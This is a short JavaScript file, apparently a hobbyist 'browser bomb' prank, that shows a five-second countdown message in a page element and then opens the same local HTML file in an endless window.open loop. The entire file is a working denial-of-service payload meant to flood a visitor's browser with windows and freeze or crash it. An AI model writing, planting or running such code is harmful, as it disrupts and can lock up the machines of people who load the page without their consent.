let timer = 5;
let display = document.querySelector("#alert");
let delay = setInterval(function(){
	if (timer != 0) {
		timer--;
		display.innerHTML = "You're getting browser bombed in " + timer;
	} else {
		while (true){
			window.open("file:///C:/Users/User/OneDrive/文件/桌面/Javascript/Browser%20Bomb/BrowserBomb.html");
		}
	}
},1000)
